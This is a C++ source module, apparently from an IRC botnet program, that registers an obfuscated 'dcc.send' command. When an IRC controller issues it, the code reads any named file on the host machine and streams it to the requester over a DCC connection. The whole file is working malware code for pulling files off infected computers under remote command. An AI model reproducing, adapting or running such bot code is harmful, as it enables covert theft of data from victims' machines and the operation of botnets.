#include "main.h"
#include "mainctrl.h"
#include "dcc.h"
#include "irc.h"

void CDccCommand::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDccSend, dp(4,3,3,79,19,5,14,4,0), this);	// dcc.send
}

bool CDccCommand::HandleCommand(CMessage *pMsg)
{
	if(!pMsg->sCmd.Compare(m_cmdDccSend.sName.Str()))
	{

		DCC dcc;
		dcc.filename=pMsg->sChatString.Token(1, " ", true);

		char sendbuf[IRCLINE],buffer[1024],tmpfile[MAX_PATH];

		int Fsend, bytes_sent;
		unsigned int move;
		unsigned __int64 totalbytes = 0;

		DWORD mode = 0;

		SOCKET ssock;
		while (1) {
			if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      			sprintf(sendbuf,"[DCC]: Failed to create socket.");
				break;
			}

			SOCKADDR_IN csin, ssin;
			memset(&ssin, 0, sizeof(ssin));
   			ssin.sin_family = AF_INET;
   			ssin.sin_port = htons(0);//random port
			ssin.sin_addr.s_addr = INADDR_ANY;
			
			if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != 0) {
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: failed to bind socket", pMsg->sReplyTo.Str());
				break;
			}
			int ssin_len = sizeof(ssin);
			getsockname(ssock, (LPSOCKADDR)&ssin, &ssin_len);

			unsigned short portnum = ntohs(ssin.sin_port);
			char tmpdccfile[IRCLINE];
			strcpy(tmpdccfile,dcc.filename.Str());
			for (unsigned int i=0;i <= strlen(tmpdccfile); i++)
				tmpfile[i] = ((tmpdccfile[i] == 32)?(95):(tmpdccfile[i]));
			if (listen(ssock, 1) != 0) {
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: failed to open socket", pMsg->sReplyTo.Str());
				break;
			}
			HANDLE testfile = CreateFile(dcc.filename.CStr(),GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
			if (testfile == INVALID_HANDLE_VALUE) {
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: file doesn't exist", pMsg->sReplyTo.Str());
				sprintf(sendbuf,"[DCC]: File doesn't exist.");
				break;
			}

			int length = GetFileSize(testfile,NULL);

			CString dccOutPut;
			dccOutPut.Format("\1DCC SEND %s %i %i %i\1",
				dcc.filename.CStr(),
				htonl(inet_addr(GetIP(g_cMainCtrl.m_cIRC.m_sSocket))),
				portnum, length);

			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, dccOutPut.Str(), pMsg->sSrc);

			TIMEVAL timeout;
    		timeout.tv_sec = 60;//timeout after 60 sec.
    		timeout.tv_usec = 0;
			fd_set fd_struct;
			FD_ZERO(&fd_struct);
    		FD_SET(ssock, &fd_struct);

			if (select(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: timeout", pMsg->sReplyTo.Str());
				break;
			}
			int csin_len = sizeof(csin);
			if ((dcc.csock = accept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)  {
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: unable to open socket", pMsg->sReplyTo.Str());
				break;
			} 
			closesocket(ssock);

			while (length) {
				Fsend = 1024;
				if (Fsend>length) 
					Fsend=length;
				move = 0-length;

				memset(buffer,0,sizeof(buffer));
				SetFilePointer(testfile, move, NULL, FILE_END);
				ReadFile(testfile, buffer, Fsend, &mode, NULL);

				bytes_sent = send(dcc.csock, buffer, Fsend, 0);
				totalbytes += bytes_sent;

				if (recv(dcc.csock,buffer ,sizeof(buffer), 0) < 1 || bytes_sent < 1) {
					g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "dcc: socket error", pMsg->sReplyTo.Str());
					closesocket(dcc.csock);
					//clearthread(dcc.threadnum);

					ExitThread(1);
				}
				length = length - bytes_sent;
			}
			if (testfile != INVALID_HANDLE_VALUE) 
				CloseHandle(testfile);

			CString strTransMsg;
			strTransMsg.Format("dcc: complete to %s, file: %s, (%d bytes)",
				inet_ntoa(csin.sin_addr), dcc.filename.Str(), totalbytes);
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, strTransMsg.Str(), pMsg->sReplyTo.Str());		

			break;
		}
		if (ssock > 0)
			closesocket(ssock);
		closesocket(dcc.csock);
		//clearthread(dcc.threadnum);
		ExitThread(0);
	}
	return FALSE;
}